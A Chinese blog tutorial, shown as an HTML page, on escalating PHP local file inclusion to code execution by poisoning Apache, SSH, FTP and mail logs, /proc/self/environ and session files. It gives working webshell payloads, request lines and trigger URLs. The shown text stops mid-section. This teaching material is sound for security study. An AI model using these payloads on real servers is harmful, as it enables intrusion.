@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言文件包含漏洞（File Inclusion）是 Web 安全中常见的漏洞类型。当应用使用用户可控输入动态包含文件时，攻击者可借此读取敏感文件，甚至实现远程代码执行（RCE）。很多人认为本地文件包含（LFI）”只能读文件”，但通过日志注入（Log Poisoning）和 Session 文件包含等技术，LFI 可以升级为完整的代码执行。本文将系统性地梳理这些攻击方法。  免责声明：本文技术仅供安">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞：日志注入与Session包含">
+<meta property="og:url" content="https://congliang.github.io/LFI-log-poisoning-session/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言文件包含漏洞（File Inclusion）是 Web 安全中常见的漏洞类型。当应用使用用户可控输入动态包含文件时，攻击者可借此读取敏感文件，甚至实现远程代码执行（RCE）。很多人认为本地文件包含（LFI）”只能读文件”，但通过日志注入（Log Poisoning）和 Session 文件包含等技术，LFI 可以升级为完整的代码执行。本文将系统性地梳理这些攻击方法。  免责声明：本文技术仅供安">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.920Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/LFI-log-poisoning-session/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/LFI-log-poisoning-session/","path":"LFI-log-poisoning-session/","title":"文件包含漏洞：日志注入与Session包含"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>文件包含漏洞：日志注入与Session包含 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Apache-Access-Log-Poisoning"><span class="nav-number">2.</span> <span class="nav-text">一、Apache Access Log Poisoning</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 基本原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 攻击流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E5%B8%B8%E8%A7%81%E6%97%A5%E5%BF%97%E8%B7%AF%E5%BE%84"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 常见日志路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E7%BB%95%E8%BF%87%E6%97%A5%E5%BF%97%E7%BC%96%E7%A0%81"><span class="nav-number">2.4.</span> <span class="nav-text">1.4 绕过日志编码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81SSH-Auth-Log-Poisoning"><span class="nav-number">3.</span> <span class="nav-text">二、SSH Auth Log Poisoning</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">3.1.</span> <span class="nav-text">2.1 攻击原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E5%B8%B8%E8%A7%81%E8%AE%A4%E8%AF%81%E6%97%A5%E5%BF%97%E8%B7%AF%E5%BE%84"><span class="nav-number">3.2.</span> <span class="nav-text">2.2 常见认证日志路径</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-FTP-%E7%99%BB%E5%BD%95%E6%97%A5%E5%BF%97"><span class="nav-number">3.3.</span> <span class="nav-text">2.3 FTP 登录日志</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Mail-Log-Poisoning"><span class="nav-number">4.</span> <span class="nav-text">三、Mail Log Poisoning</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E5%8E%9F%E7%90%86"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 攻击演示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-%E9%82%AE%E4%BB%B6%E6%97%A5%E5%BF%97%E8%B7%AF%E5%BE%84"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 邮件日志路径</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81-proc-self-environ-%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">四、&#x2F;proc&#x2F;self&#x2F;environ 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%8E%9F%E7%90%86"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 攻击演示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 限制条件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81PHP-Session-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">6.</span> <span class="nav-text">五、PHP Session 文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-Session-%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 Session 存储机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E7%BB%8F%E5%85%B8%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 经典攻击流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E5%88%A9%E7%94%A8-session-upload-progress%EF%BC%88%E6%97%A0%E9%9C%80%E6%B3%A8%E5%86%8C%EF%BC%89"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 利用 session.upload_progress（无需注册）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-Session-%E8%B7%AF%E5%BE%84%E6%B1%87%E6%80%BB"><span class="nav-number">6.4.</span> <span class="nav-text">5.4 Session 路径汇总</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81PHP-%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88phpinfo-LFI-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">六、PHP 临时文件包含（phpinfo + LFI 条件竞争）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E5%8E%9F%E7%90%86"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E7%89%87%E6%AE%B5"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 利用脚本片段</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81Windows-%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97"><span class="nav-number">8.</span> <span class="nav-text">七、Windows 应用日志</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">9.</span> <span class="nav-text">八、防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="nav-number">9.1.</span> <span class="nav-text">8.1 代码层面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B1%82%E9%9D%A2"><span class="nav-number">9.2.</span> <span class="nav-text">8.2 服务器层面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E6%97%A5%E5%BF%97%E5%B1%82%E9%9D%A2"><span class="nav-number">9.3.</span> <span class="nav-text">8.3 日志层面</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">10.</span> <span class="nav-text">九、总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/LFI-log-poisoning-session/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="文件包含漏洞：日志注入与Session包含 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件包含漏洞：日志注入与Session包含
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-09-15 08:00:00" itemprop="dateCreated datePublished" datetime="2025-09-15T08:00:00+08:00">2025-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文件包含漏洞（File Inclusion）是 Web 安全中常见的漏洞类型。当应用使用用户可控输入动态包含文件时，攻击者可借此读取敏感文件，甚至实现远程代码执行（RCE）。很多人认为本地文件包含（LFI）”只能读文件”，但通过日志注入（Log Poisoning）和 Session 文件包含等技术，LFI 可以升级为完整的代码执行。本文将系统性地梳理这些攻击方法。</p>
+<blockquote>
+<p><strong>免责声明</strong>：本文技术仅供安全研究与授权测试。未经授权的攻击行为均属违法，使用者须自行承担责任。</p>
+</blockquote>
+<hr>
+<h2 id="一、Apache-Access-Log-Poisoning"><a href="#一、Apache-Access-Log-Poisoning" class="headerlink" title="一、Apache Access Log Poisoning"></a>一、Apache Access Log Poisoning</h2><h3 id="1-1-基本原理"><a href="#1-1-基本原理" class="headerlink" title="1.1 基本原理"></a>1.1 基本原理</h3><p>Apache 将 HTTP 访问日志默认写入 <code>/var/log/apache2/access.log</code>。攻击者请求中包含 PHP 代码时，该代码被原样记录到日志中；通过 LFI 包含该日志文件后，PHP 引擎解析并执行其中的代码。</p>
+<h3 id="1-2-攻击流程"><a href="#1-2-攻击流程" class="headerlink" title="1.2 攻击流程"></a>1.2 攻击流程</h3><p><strong>第 1 步：发送携带 PHP 代码的 HTTP 请求</strong></p>
+<p>最佳注入位置是 <code>User-Agent</code> 头——日志格式必含 User-Agent 且该字段允许任意字符。URI 路径也可注入：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/&lt;?php</span> system($_<span class="keyword">GET</span>[&#x27;cmd&#x27;]); <span class="string">?&gt;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>target.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 &lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>日志条目呈现为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.100 - - [15/Sep/2025:10:30:45] &quot;GET /&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt; HTTP/1.1&quot; 404 512 &quot;-&quot; &quot;Mozilla/5.0 &lt;?php phpinfo(); ?&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>第 2 步：通过 LFI 包含日志</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/index.php?page=/var/log/apache2/access.log&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+<p>PHP 解析日志遇到 <code>&lt;?php ... ?&gt;</code> 标签后执行代码。</p>
+<h3 id="1-3-常见日志路径"><a href="#1-3-常见日志路径" class="headerlink" title="1.3 常见日志路径"></a>1.3 常见日志路径</h3><table>
+<thead>
+<tr>
+<th>操作系统</th>
+<th>Apache 访问日志</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Debian&#x2F;Ubuntu</td>
+<td><code>/var/log/apache2/access.log</code></td>
+</tr>
+<tr>
+<td>RHEL&#x2F;CentOS</td>
+<td><code>/var/log/httpd/access_log</code></td>
+</tr>
+<tr>
+<td>Arch Linux</td>
+<td><code>/var/log/httpd/access_log</code></td>
+</tr>
+<tr>
+<td>FreeBSD</td>
+<td><code>/var/log/httpd-access.log</code></td>
+</tr>
+<tr>
+<td>XAMPP (Linux)</td>
+<td><code>/opt/lampp/logs/access_log</code></td>
+</tr>
+<tr>
+<td>XAMPP (Windows)</td>
+<td><code>C:\xampp\apache\logs\access.log</code></td>
+</tr>
+</tbody></table>
+<h3 id="1-4-绕过日志编码"><a href="#1-4-绕过日志编码" class="headerlink" title="1.4 绕过日志编码"></a>1.4 绕过日志编码</h3><p>某些 Apache 配置使用 <code>mod_log_config</code> 对特殊字符编码（空格→<code>%20</code>），导致 PHP 代码无法正确执行。此时可使用无空格、无特殊字符的 short tag payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">0</span>]`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此 payload 不受编码影响，但需要目标启用 <code>short_open_tag</code>（PHP 5.4 起默认开启）。</p>
+<hr>
+<h2 id="二、SSH-Auth-Log-Poisoning"><a href="#二、SSH-Auth-Log-Poisoning" class="headerlink" title="二、SSH Auth Log Poisoning"></a>二、SSH Auth Log Poisoning</h2><h3 id="2-1-攻击原理"><a href="#2-1-攻击原理" class="headerlink" title="2.1 攻击原理"></a>2.1 攻击原理</h3><p>SSH 认证日志 <code>/var/log/auth.log</code> 记录每次登录尝试的用户名。攻击者在 SSH 连接时将 PHP 代码注入用户名，即使登录失败，日志也会保留恶意代码，随后通过 LFI 执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>@target.com</span><br></pre></td></tr></table></figure>
+
+<p>日志内容示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sep 15 10:45:22 server sshd[1234]: Failed password for &lt;?php system($_GET[&quot;cmd&quot;]); ?&gt; from 192.168.1.200 port 44444 ssh2</span><br></pre></td></tr></table></figure>
+
+<p>然后 LFI 包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/index.php?page=/var/log/auth.log&amp;cmd=whoami</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-常见认证日志路径"><a href="#2-2-常见认证日志路径" class="headerlink" title="2.2 常见认证日志路径"></a>2.2 常见认证日志路径</h3><table>
+<thead>
+<tr>
+<th>发行版</th>
+<th>auth.log</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Debian&#x2F;Ubuntu</td>
+<td><code>/var/log/auth.log</code></td>
+</tr>
+<tr>
+<td>RHEL&#x2F;CentOS</td>
+<td><code>/var/log/secure</code></td>
+</tr>
+<tr>
+<td>FreeBSD</td>
+<td><code>/var/log/auth.log</code></td>
+</tr>
+</tbody></table>
+<h3 id="2-3-FTP-登录日志"><a href="#2-3-FTP-登录日志" class="headerlink" title="2.3 FTP 登录日志"></a>2.3 FTP 登录日志</h3><p>类似思路适用于 FTP 服务。连接时在用户名中注入 PHP：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; open target.com</span><br><span class="line">Name: &lt;?php system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>vsftpd 日志路径：<code>/var/log/vsftpd.log</code></p>
+<hr>
+<h2 id="三、Mail-Log-Poisoning"><a href="#三、Mail-Log-Poisoning" class="headerlink" title="三、Mail Log Poisoning"></a>三、Mail Log Poisoning</h2><h3 id="3-1-原理"><a href="#3-1-原理" class="headerlink" title="3.1 原理"></a>3.1 原理</h3><p>若目标运行邮件服务（Sendmail&#x2F;Postfix），<code>/var/log/mail.log</code> 记录所有收发信息。攻击者通过发送含 PHP 代码的邮件注入日志。</p>
+<h3 id="3-2-攻击演示"><a href="#3-2-攻击演示" class="headerlink" title="3.2 攻击演示"></a>3.2 攻击演示</h3><p>使用 telnet 连接 SMTP 端口 25，在 <code>MAIL FROM</code> 中注入 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">telnet target.com 25</span><br><span class="line">EHLO attacker.com</span><br><span class="line">MAIL FROM: &lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br><span class="line">RCPT TO: admin@target.com</span><br><span class="line">DATA</span><br><span class="line">Subject: Test</span><br><span class="line">.</span><br><span class="line">QUIT</span><br></pre></td></tr></table></figure>
+
+<p>发送后 <code>/var/log/mail.log</code> 出现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sep 15 11:02:15 server sendmail[5678]: from=&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;, size=...</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-邮件日志路径"><a href="#3-3-邮件日志路径" class="headerlink" title="3.3 邮件日志路径"></a>3.3 邮件日志路径</h3><table>
+<thead>
+<tr>
+<th>服务</th>
+<th>日志路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Postfix</td>
+<td><code>/var/log/mail.log</code></td>
+</tr>
+<tr>
+<td>Sendmail</td>
+<td><code>/var/log/maillog</code></td>
+</tr>
+<tr>
+<td>Exim</td>
+<td><code>/var/log/exim/mainlog</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="四、-proc-self-environ-注入"><a href="#四、-proc-self-environ-注入" class="headerlink" title="四、&#x2F;proc&#x2F;self&#x2F;environ 注入"></a>四、&#x2F;proc&#x2F;self&#x2F;environ 注入</h2><h3 id="4-1-原理"><a href="#4-1-原理" class="headerlink" title="4.1 原理"></a>4.1 原理</h3><p>Linux 伪文件系统 <code>/proc/self/environ</code> 存储当前进程环境变量。Apache&#x2F;Nginx 将 HTTP 头转为环境变量：<code>User-Agent</code> → <code>HTTP_USER_AGENT</code>，<code>Accept-Language</code> → <code>HTTP_ACCEPT_LANGUAGE</code>。攻击者在 HTTP 头中注入 PHP 代码后，通过 LFI 包含 <code>/proc/self/environ</code> 即可执行。</p>
+<h3 id="4-2-攻击演示"><a href="#4-2-攻击演示" class="headerlink" title="4.2 攻击演示"></a>4.2 攻击演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;User-Agent: &lt;?php system(&#x27;id&#x27;); ?&gt;&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://target.com/index.php?page=/proc/self/environ&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>/proc/self/environ</code> 格式为 <code>KEY=VALUE\0...</code>，PHP 解析其中的 PHP 标签后执行代码。</p>
+<h3 id="4-3-限制条件"><a href="#4-3-限制条件" class="headerlink" title="4.3 限制条件"></a>4.3 限制条件</h3><ul>
+<li>Apache <code>mod_env</code> 和 CGI 模式默认转换 HTTP 头；FastCGI&#x2F;PHP-FPM 可能需要特定配置。</li>
+<li>读取权限取决于 PHP 进程 uid。需要 <code>/proc/self/environ</code> 对 Web 用户可读。</li>
+</ul>
+<hr>
+<h2 id="五、PHP-Session-文件包含"><a href="#五、PHP-Session-文件包含" class="headerlink" title="五、PHP Session 文件包含"></a>五、PHP Session 文件包含</h2><h3 id="5-1-Session-存储机制"><a href="#5-1-Session-存储机制" class="headerlink" title="5.1 Session 存储机制"></a>5.1 Session 存储机制</h3><p>PHP 默认以文件存储 Session：Linux 下 <code>/tmp/sess_&lt;id&gt;</code> 或 <code>/var/lib/php/sessions/sess_&lt;id&gt;</code>，文件内容为 <code>key|serialized_value</code>。若攻击者能控制 <code>$_SESSION</code> 中某个值（如注册页面的用户名），则可将 PHP 代码写入 Session 文件。</p>
+<h3 id="5-2-经典攻击流程"><a href="#5-2-经典攻击流程" class="headerlink" title="5.2 经典攻击流程"></a>5.2 经典攻击流程</h3><ol>
+<li>在注册表单用户名字段注入 <code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></li>
+<li>获取当前 Session ID（Cookie <code>PHPSESSID</code>）</li>
